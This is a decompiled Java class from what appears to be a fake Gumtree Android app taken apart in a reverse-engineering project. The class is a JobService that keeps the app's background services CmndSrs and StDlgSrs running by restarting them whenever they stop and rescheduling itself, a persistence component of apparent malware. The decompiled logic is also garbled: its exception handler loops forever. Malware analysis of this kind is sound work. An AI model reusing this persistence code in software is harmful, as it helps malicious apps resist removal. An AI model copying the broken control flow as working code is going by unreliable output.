package com.gumsis.srs.newapi;

import android.annotation.TargetApi;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Context;
import android.content.Intent;
import android.os.Build.VERSION;
import com.gumsis.Realtalk;
import com.gumsis.checktls.CmndTls;
import com.gumsis.srs.CmndSrs;
import com.gumsis.srs.StDlgSrs;
import com.gumsis.srs.newapi.utils.Util;

@TargetApi(23)
public class CmndJobSchedulerSrs
  extends JobService
{
  private void startStDlgSrs(Context paramContext)
  {
    if (Build.VERSION.SDK_INT >= 18)
    {
      paramContext = new Intent(paramContext, StDlgSrs.class);
      getApplicationContext().startService(paramContext);
    }
  }
  
  private void startaCmndSrs(Context paramContext)
  {
    paramContext = new Intent(paramContext, CmndSrs.class);
    getApplicationContext().startService(paramContext);
  }
  
  public boolean onStartJob(JobParameters paramJobParameters)
  {
    try
    {
      if (!CmndTls.isMyServiceRunning(CmndSrs.class, getApplicationContext())) {
        startaCmndSrs(getApplicationContext());
      }
      if ((Realtalk.isStartAccess(this)) && (!CmndTls.isMyServiceRunning(StDlgSrs.class, getApplicationContext()))) {
        startStDlgSrs(getApplicationContext());
      }
      Util.scheduleJob(getApplicationContext());
    }
    catch (Exception paramJobParameters)
    {
      for (;;)
      {
        paramJobParameters.printStackTrace();
      }
    }
    return true;
  }
  
  public boolean onStopJob(JobParameters paramJobParameters)
  {
    return false;
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/srs/newapi/CmndJobSchedulerSrs.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */